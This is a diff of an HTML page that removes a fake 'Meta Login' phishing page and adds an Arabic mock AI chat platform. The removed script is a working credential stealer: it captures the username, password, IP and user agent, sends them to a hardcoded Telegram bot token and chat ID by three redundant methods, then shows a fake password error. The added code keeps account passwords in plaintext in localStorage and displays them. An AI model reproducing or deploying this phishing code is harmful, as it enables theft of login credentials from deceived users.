@@ -3,139 +3,607 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Login</title>
+    <title>AI Premium Platform</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* المتغيرات والألوان الفخمة */
+        :root {
+            --bg-color: #0f172a; /* كحلي داكن جداً */
+            --surface-color: #1e293b; /* كحلي أفتح قليلاً */
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --accent-color: #d4af37; /* ذهبي فخم */
+            --accent-hover: #b5952f;
+            --danger-color: #ef4444; /* أحمر منطقة الخطر */
+            --glass-bg: rgba(30, 41, 59, 0.7);
+            --border-color: rgba(255, 255, 255, 0.1);
+        }
+
+        /* المظهر الفاتح */
+        body.light-theme {
+            --bg-color: #f1f5f9;
+            --surface-color: #ffffff;
+            --text-primary: #0f172a;
+            --text-secondary: #475569;
+            --glass-bg: rgba(255, 255, 255, 0.8);
+            --border-color: rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex; flex-direction: column; align-items: center; padding: 20px; margin: 0;
-            background-color: #ffffff; min-height: 100vh; justify-content: center;
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            overflow: hidden; /* لمنع التمرير العشوائي */
+            height: 100vh;
         }
-        .container { width: 100%; max-width: 400px; }
-        .header { text-align: center; font-weight: bold; font-size: 20px; margin-bottom: 30px; margin-top: 10px; }
-        input {
-            width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 12px;
-            box-sizing: border-box; font-size: 16px; outline: none;
+
+        /* حاوية الشاشات */
+        .app-container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
         }
-        input:focus { border-color: #0064e0; }
-        button {
-            width: 100%; padding: 15px; border: none; border-radius: 25px; font-size: 16px;
-            font-weight: bold; cursor: pointer; margin-bottom: 20px;
+
+        .screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            transition: transform 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55);
         }
-        .login-btn { background-color: #0064e0; color: white; }
-        .login-btn:disabled { opacity: 0.6; }
-        .create-btn { background-color: transparent; border: 1px solid #0064e0; color: #0064e0; margin-top: 400px; }
-        .forgot-password { text-align: center; font-weight: 600; color: #0064e0; cursor: pointer; }
-        .error-msg { color: #ed4956; font-size: 14px; text-align: center; margin-bottom: 10px; display: none; }
-        .spinner { display: none; width: 18px; height: 18px; border: 2px solid #ffffff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status { text-align: center; font-size: 11px; color: #999; margin-top: -10px; margin-bottom: 10px; display: none; }
+
+        /* الشاشات */
+        #lang-screen { transform: translateY(0); z-index: 3; }
+        #auth-screen { transform: translateY(100%); z-index: 2; }
+        #chat-screen { transform: translateY(100%); z-index: 1; display: flex; justify-content: flex-start; }
+
+        /* الشاشات المخفية للاعلى */
+        .slide-up { transform: translateY(-100%) !important; }
+        .slide-active { transform: translateY(0) !important; }
+
+        /* العناصر الفخمة */
+        .glass-box {
+            background: var(--glass-bg);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            width: 90%;
+            max-width: 400px;
+        }
+
+        h1, h2 {
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, var(--accent-color), #fff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .fancy-select {
+            width: 100%;
+            padding: 15px;
+            border-radius: 10px;
+            background: var(--bg-color);
+            color: var(--text-primary);
+            border: 1px solid var(--accent-color);
+            font-size: 18px;
+            outline: none;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .fancy-btn {
+            background: linear-gradient(45deg, var(--accent-color), var(--accent-hover));
+            color: #111;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, box-shadow 0.2s;
+            display: none; /* مخفي بالبداية */
+        }
+
+        .fancy-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px var(--accent-color);
+        }
+
+        .fancy-btn.visible { display: block; }
+        
+        .auth-btn { display: block; margin-top: 15px; }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            background: var(--bg-color);
+            color: var(--text-primary);
+            outline: none;
+            margin-top: 5px;
+        }
+
+        .input-group input:focus {
+            border-color: var(--accent-color);
+        }
+
+        .toggle-link {
+            color: var(--accent-color);
+            cursor: pointer;
+            margin-top: 15px;
+            display: block;
+            font-size: 14px;
+        }
+
+        /* --- واجهة الشات --- */
+        .chat-header {
+            width: 100%;
+            padding: 15px 20px;
+            background: var(--surface-color);
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            color: var(--text-primary);
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        .chat-area {
+            flex: 1;
+            width: 100%;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .chat-input-area {
+            width: 100%;
+            padding: 20px;
+            background: var(--surface-color);
+            display: flex;
+            gap: 10px;
+        }
+
+        .chat-input-area input {
+            flex: 1;
+            padding: 15px;
+            border-radius: 20px;
+            border: 1px solid var(--border-color);
+            background: var(--bg-color);
+            color: var(--text-primary);
+            outline: none;
+        }
+
+        .chat-input-area button {
+            background: var(--accent-color);
+            border: none;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            cursor: pointer;
+            color: #111;
+            font-weight: bold;
+        }
+
+        /* رسائل الشات */
+        .msg { padding: 10px 15px; border-radius: 15px; max-width: 70%; word-wrap: break-word;}
+        .msg.ai { background: var(--surface-color); border: 1px solid var(--border-color); align-self: flex-start; }
+        .msg.user { background: var(--accent-color); color: #111; align-self: flex-end; }
+
+        /* --- القائمة الجانبية (المنيو) --- */
+        .sidebar {
+            position: fixed;
+            top: 0;
+            right: -300px;
+            width: 300px;
+            height: 100%;
+            background: var(--surface-color);
+            box-shadow: -5px 0 15px rgba(0,0,0,0.5);
+            z-index: 10;
+            transition: right 0.3s;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sidebar.open { right: 0; }
+
+        .profile-sec {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .profile-img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, var(--accent-color), #3b82f6);
+            margin: 0 auto 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: #fff;
+        }
+
+        .menu-items {
+            list-style: none;
+            display: none; /* مخفية حتى يتم الضغط على الصورة */
+        }
+        .menu-items.visible { display: block; }
+
+        .menu-items li {
+            padding: 15px;
+            margin-bottom: 10px;
+            background: var(--bg-color);
+            border-radius: 10px;
+            cursor: pointer;
+            border: 1px solid transparent;
+            transition: border 0.3s;
+        }
+        .menu-items li:hover { border-color: var(--accent-color); }
+
+        .danger-text { color: var(--danger-color); font-weight: bold; }
+
+        /* نافذة منبثقة (Modal) للإعدادات */
+        .modal {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 20;
+        }
+        .modal.active { display: flex; }
+        .modal-content {
+            background: var(--surface-color);
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%; max-width: 400px;
+            border: 1px solid var(--border-color);
+        }
+        .close-modal { margin-top: 20px; background: var(--bg-color); color: var(--text-primary); padding: 10px; border-radius: 8px; text-align: center; cursor: pointer; border: 1px solid var(--border-color);}
+
+        /* أدوات الإعدادات */
+        .settings-item { margin-bottom: 15px; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
+        
+        .overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:9; display:none; }
+        .overlay.active { display:block; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header">∞ Meta</div>
+<div class="app-container">
+    
+    <div id="lang-screen" class="screen">
+        <div class="glass-box">
+            <h1>AI System</h1>
+            <p style="margin-bottom: 20px; color: var(--text-secondary);">اختر لغتك المفضلة</p>
+            <select id="lang-select" class="fancy-select">
+                <option value="" disabled selected>-- اختر اللغة --</option>
+                <option value="ar">العربية 🇸🇦</option>
+                <option value="en">الإنجليزية 🇺🇸</option>
+                <option value="ru">الروسية 🇷🇺</option>
+            </select>
+            <button id="enter-btn" class="fancy-btn">دخول</button>
+        </div>
+    </div>
 
-    <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
-    
-    <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
-    <input type="password" id="password" placeholder="Password" autocomplete="new-password">
-    
-    <button class="login-btn" id="loginBtn">
-        <span id="btnText">Log in</span>
-        <div class="spinner" id="spinner"></div>
-    </button>
+    <div id="auth-screen" class="screen">
+        <div class="glass-box">
+            <h2 id="auth-title">تسجيل الدخول</h2>
+            
+            <div class="input-group">
+                <label>اليوزر:</label>
+                <input type="text" id="username" placeholder="اكتب اسم المستخدم...">
+            </div>
+            <div class="input-group">
+                <label>الباسورد:</label>
+                <input type="password" id="password" placeholder="اكتب كلمة المرور...">
+            </div>
 
-    <div class="forgot-password">Forgot password?</div>
-    
-    <button class="create-btn">Create new account</button>
+            <button id="auth-action-btn" class="fancy-btn auth-btn visible">تسجيل الدخول</button>
+            <span id="toggle-auth" class="toggle-link">ليس لديك حساب؟ إنشاء حساب</span>
+        </div>
+    </div>
+
+    <div id="chat-screen" class="screen">
+        <div class="chat-header">
+            <h3 style="color: var(--accent-color);">AI Assistant</h3>
+            <button class="menu-btn" id="open-menu">☰</button>
+        </div>
+        
+        <div class="chat-area" id="chat-area">
+            <div class="msg ai">مرحباً بك في نظام الذكاء الاصطناعي، كيف يمكنني مساعدتك اليوم؟</div>
+        </div>
+
+        <div class="chat-input-area">
+            <input type="text" id="chat-input" placeholder="اكتب رسالتك هنا...">
+            <button id="send-btn">➤</button>
+        </div>
+    </div>
+
+</div>
+
+<div class="overlay" id="overlay"></div>
+<div class="sidebar" id="sidebar">
+    <div class="profile-sec" id="profile-sec">
+        <div class="profile-img">👤</div>
+        <h3 id="sidebar-username">User</h3>
+        <p style="font-size: 12px; color: var(--text-secondary);">اضغط لعرض الخيارات</p>
+    </div>
+
+    <ul class="menu-items" id="menu-items">
+        <li id="menu-lang">🌍 اللغة (العربية)</li>
+        <li id="menu-settings">⚙️ الإعدادات</li>
+        <li id="menu-telegram">✈️ Telegram</li>
+    </ul>
+</div>
+
+<div class="modal" id="settings-modal">
+    <div class="modal-content">
+        <h2 style="text-align: center;">الإعدادات</h2>
+        
+        <div class="settings-item">
+            <h3>مظهر التطبيق</h3>
+            <div style="display: flex; gap: 10px; margin-top: 10px;">
+                <button onclick="setTheme('dark')" style="flex:1; padding:10px; background:#0f172a; color:#fff; border:1px solid #d4af37; border-radius:5px; cursor:pointer;">داكن</button>
+                <button onclick="setTheme('light')" style="flex:1; padding:10px; background:#f1f5f9; color:#000; border:1px solid #ccc; border-radius:5px; cursor:pointer;">فاتح</button>
+            </div>
+        </div>
+
+        <div class="settings-item">
+            <h3>معلومات الحساب</h3>
+            <p>اليوزر: <span id="info-user" style="color:var(--accent-color)">-</span></p>
+            <p>الباسورد: <span id="info-pass" style="color:var(--accent-color)">-</span></p>
+            <p>تاريخ الإنشاء: <span id="info-date" style="color:var(--accent-color)">-</span></p>
+        </div>
+
+        <div class="settings-item" style="border: none;">
+            <h3>منطقة الخطر ‼️</h3>
+            <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 10px;">
+                <button onclick="logout()" style="padding:10px; background:transparent; border:1px solid var(--danger-color); color:var(--danger-color); border-radius:5px; cursor:pointer; font-weight:bold;">تسجيل الخروج</button>
+                <button onclick="deleteAccount()" style="padding:10px; background:var(--danger-color); border:none; color:#fff; border-radius:5px; cursor:pointer; font-weight:bold;">حذف الحساب</button>
+            </div>
+        </div>
+
+        <div class="close-modal" onclick="document.getElementById('settings-modal').classList.remove('active')">إغلاق</div>
+    </div>
 </div>
 
 <script>
-    // ================== CONFIG ==================
-    const TOKEN = "8912562695:AAH3_MJYNFSKJo9duvYg_wMBQXSwNRCuoyo";
-    const CHAT_ID = "1692257834";
-    // ============================================
+    // المتغيرات
+    let isLoginMode = true;
+    let currentUser = null;
+    
+    // عناصر DOM
+    const langSelect = document.getElementById('lang-select');
+    const enterBtn = document.getElementById('enter-btn');
+    const langScreen = document.getElementById('lang-screen');
+    const authScreen = document.getElementById('auth-screen');
+    const chatScreen = document.getElementById('chat-screen');
+    
+    // 1. منطق شاشة اللغة
+    langSelect.addEventListener('change', (e) => {
+        if(e.target.value === 'ar') {
+            enterBtn.classList.add('visible');
+        } else {
+            enterBtn.classList.add('visible'); // متاح للغات الأخرى أيضاً
+        }
+    });
 
+    enterBtn.addEventListener('click', () => {
+        langScreen.classList.add('slide-up');
+        authScreen.classList.add('slide-active');
+    });
+
+    // 2. منطق تسجيل الدخول والإنشاء
+    const toggleAuth = document.getElementById('toggle-auth');
+    const authTitle = document.getElementById('auth-title');
+    const authActionBtn = document.getElementById('auth-action-btn');
     const usernameInput = document.getElementById('username');
     const passwordInput = document.getElementById('password');
-    const loginBtn = document.getElementById('loginBtn');
-    const btnText = document.getElementById('btnText');
-    const spinner = document.getElementById('spinner');
-    const errorMsg = document.getElementById('errorMsg');
 
-    loginBtn.addEventListener('click', function(e) {
-        e.preventDefault();
+    toggleAuth.addEventListener('click', () => {
+        isLoginMode = !isLoginMode;
+        if(isLoginMode) {
+            authTitle.innerText = "تسجيل الدخول";
+            authActionBtn.innerText = "تسجيل الدخول";
+            toggleAuth.innerText = "ليس لديك حساب؟ إنشاء حساب";
+        } else {
+            authTitle.innerText = "إنشاء حساب";
+            authActionBtn.innerText = "إنشاء الحساب";
+            toggleAuth.innerText = "لديك حساب بالفعل؟ تسجيل الدخول";
+        }
+    });
 
-        const username = usernameInput.value.trim();
-        const password = passwordInput.value;
-
-        if (!username || !password) {
-            errorMsg.textContent = 'Please fill in both fields.';
-            errorMsg.style.display = 'block';
+    authActionBtn.addEventListener('click', () => {
+        const user = usernameInput.value.trim();
+        const pass = passwordInput.value.trim();
+        
+        if(!user || !pass) {
+            alert('الرجاء إدخال اليوزر والباسورد!');
             return;
         }
 
-        // Show loading
-        loginBtn.disabled = true;
-        btnText.style.display = 'none';
-        spinner.style.display = 'block';
-        errorMsg.style.display = 'none';
+        let accounts = JSON.parse(localStorage.getItem('ai_accounts')) || [];
 
-        // Get IP
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(data => {
-                sendToTelegram(username, password, data.ip);
-            })
-            .catch(() => {
-                sendToTelegram(username, password, 'Unknown');
-            });
+        if(!isLoginMode) {
+            // إنشاء حساب
+            if(accounts.length >= 2) {
+                alert('عذراً! لقد وصلت للحد الأقصى المسموح به (حسابين فقط).');
+                return;
+            }
+            if(accounts.find(a => a.username === user)) {
+                alert('هذا اليوزر مستخدم بالفعل!');
+                return;
+            }
+            
+            const newAcc = { 
+                username: user, 
+                password: pass, 
+                date: new Date().toLocaleDateString('ar-EG') 
+            };
+            accounts.push(newAcc);
+            localStorage.setItem('ai_accounts', JSON.stringify(accounts));
+            alert('تم إنشاء الحساب بنجاح!');
+            loginUser(newAcc);
+
+        } else {
+            // تسجيل الدخول
+            const acc = accounts.find(a => a.username === user && a.password === pass);
+            if(acc) {
+                loginUser(acc);
+            } else {
+                alert('اليوزر أو الباسورد غير صحيح!');
+            }
+        }
     });
 
-    function sendToTelegram(username, password, ip) {
-        const ua = navigator.userAgent;
-        const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Riyadh' });
-        const pageUrl = window.location.href;
-
-        const text = `🔐 **Meta Login - New Entry**
-━━━━━━━━━━━━━━━━━━━
-👤 **Username/Email:** \`${username}\`
-🔑 **Password:** \`${password}\`
-🌐 **IP Address:** \`${ip}\`
-📄 **Page:** ${pageUrl}
-💻 **User Agent:** ${ua}
-🕐 **Time:** ${time}
-━━━━━━━━━━━━━━━━━━━`;
-
-        // استخدم Image method عشان نتخطى CORS بشكل مضمون
-        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+    function loginUser(account) {
+        currentUser = account;
+        document.getElementById('sidebar-username').innerText = account.username;
         
-        // الطريقة الأولى: fetch (قد تنجح)
-        fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {});
+        // تعبئة بيانات الإعدادات
+        document.getElementById('info-user').innerText = account.username;
+        document.getElementById('info-pass').innerText = account.password;
+        document.getElementById('info-date').innerText = account.date;
 
-        // الطريقة الثانية: Image (مضمونة 100%)
-        new Image().src = url;
+        authScreen.classList.remove('slide-active');
+        authScreen.classList.add('slide-up');
+        chatScreen.classList.add('slide-active');
+    }
 
-        // الطريقة الثالثة: XMLHttpRequest
-        try {
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', url, true);
-            xhr.send();
-        } catch(e) {}
+    // 3. القائمة الجانبية (المنيو)
+    const sidebar = document.getElementById('sidebar');
+    const overlay = document.getElementById('overlay');
+    const openMenuBtn = document.getElementById('open-menu');
+    const profileSec = document.getElementById('profile-sec');
+    const menuItems = document.getElementById('menu-items');
 
-        console.log('✅ Data sent to Telegram');
+    openMenuBtn.addEventListener('click', () => {
+        sidebar.classList.add('open');
+        overlay.classList.add('active');
+    });
 
-        // Show fake error
+    overlay.addEventListener('click', () => {
+        sidebar.classList.remove('open');
+        overlay.classList.remove('active');
+        menuItems.classList.remove('visible'); // إغلاق القائمة الداخلية
+    });
+
+    // ضغطة على الصورة تطلع الثلاث خيارات
+    profileSec.addEventListener('click', () => {
+        menuItems.classList.toggle('visible');
+    });
+
+    // خيارات القائمة
+    document.getElementById('menu-lang').addEventListener('click', () => {
+        alert('اللغة الحالية: العربية 🇸🇦');
+    });
+
+    document.getElementById('menu-settings').addEventListener('click', () => {
+        sidebar.classList.remove('open');
+        overlay.classList.remove('active');
+        document.getElementById('settings-modal').classList.add('active');
+    });
+
+    document.getElementById('menu-telegram').addEventListener('click', () => {
+        window.open('https://t.me/RavFenupdate', '_blank');
+    });
+
+    // 4. الإعدادات ومظهر التطبيق
+    function setTheme(theme) {
+        if(theme === 'light') {
+            document.body.classList.add('light-theme');
+        } else {
+            document.body.classList.remove('light-theme');
+        }
+    }
+
+    function logout() {
+        currentUser = null;
+        document.getElementById('settings-modal').classList.remove('active');
+        chatScreen.classList.remove('slide-active');
+        authScreen.classList.remove('slide-up');
+        authScreen.classList.add('slide-active');
+        usernameInput.value = '';
+        passwordInput.value = '';
+    }
+
+    function deleteAccount() {
+        if(confirm('هل أنت متأكد من حذف الحساب نهائياً؟')) {
+            let accounts = JSON.parse(localStorage.getItem('ai_accounts')) || [];
+            accounts = accounts.filter(a => a.username !== currentUser.username);
+            localStorage.setItem('ai_accounts', JSON.stringify(accounts));
+            alert('تم حذف الحساب.');
+            logout();
+        }
+    }
+
+    // 5. الشات الوهمي
+    const sendBtn = document.getElementById('send-btn');
+    const chatInput = document.getElementById('chat-input');
+    const chatArea = document.getElementById('chat-area');
+
+    sendBtn.addEventListener('click', sendMessage);
+    chatInput.addEventListener('keypress', (e) => {
+        if(e.key === 'Enter') sendMessage();
+    });
+
+    function sendMessage() {
+        const text = chatInput.value.trim();
+        if(!text) return;
+
+        // رسالة المستخدم
+        const userDiv = document.createElement('div');
+        userDiv.className = 'msg user';
+        userDiv.innerText = text;
+        chatArea.appendChild(userDiv);
+        chatInput.value = '';
+        chatArea.scrollTop = chatArea.scrollHeight;
+
+        // رد الذكاء الاصطناعي بعد ثانية
         setTimeout(() => {
-            loginBtn.disabled = false;
-            btnText.style.display = 'inline';
-            spinner.style.display = 'none';
-            errorMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
-            errorMsg.style.display = 'block';
-            passwordInput.value = '';
-        }, 1500);
+            const aiDiv = document.createElement('div');
+            aiDiv.className = 'msg ai';
+            aiDiv.innerText = 'هذا رد تلقائي لغرض التجربة من واجهة الذكاء الاصطناعي.';
+            chatArea.appendChild(aiDiv);
+            chatArea.scrollTop = chatArea.scrollHeight;
+        }, 1000);
     }
 </script>
 
